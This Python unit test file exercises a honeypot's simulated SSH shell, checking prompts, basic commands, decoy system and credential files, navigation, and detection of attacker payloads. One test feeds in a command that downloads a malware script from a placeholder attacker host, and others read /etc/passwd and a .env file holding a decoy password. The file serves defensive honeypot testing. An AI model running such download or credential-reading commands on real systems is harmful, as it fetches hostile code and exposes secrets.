"""Unit tests for honeynet.sshsim VirtualShell."""
from honeynet.sshsim import VirtualShell


def test_vshell_prompt():
    v = VirtualShell(username="root", hostname="test-node")
    assert "root@test-node:~#" in v.get_prompt()

    v_user = VirtualShell(username="guest", hostname="test-node")
    assert "guest@test-node:~$ " in v_user.get_prompt()


def test_vshell_basic_commands():
    v = VirtualShell(username="root", hostname="srv-01")
    out, is_exit, _ = v.execute("whoami")
    assert out.strip() == "root"
    assert is_exit is False

    out, _, _ = v.execute("id")
    assert "uid=0(root)" in out

    out, _, _ = v.execute("uname -a")
    assert "Linux srv-01" in out


def test_vshell_cat_virtual_files():
    v = VirtualShell()
    out, _, _ = v.execute("cat /etc/passwd")
    assert "root:x:0:0" in out
    assert "deploy:x:1000" in out

    out, _, _ = v.execute("cat /home/deploy/.env")
    assert "P@ssw0rd_HoneyDecoy" in out


def test_vshell_payload_detection():
    v = VirtualShell()
    out, _, meta = v.execute("wget http://attacker.com/malware.sh")
    assert meta["is_payload"] is True
    assert "Saved decoy artifact" in out


def test_vshell_navigation():
    v = VirtualShell()
    v.execute("cd /etc")
    assert v.cwd == "/etc"
    out, _, _ = v.execute("pwd")
    assert out.strip() == "/etc"


def test_vshell_exit():
    v = VirtualShell()
    out, is_exit, _ = v.execute("exit")
    assert is_exit is True
    assert "logout" in out
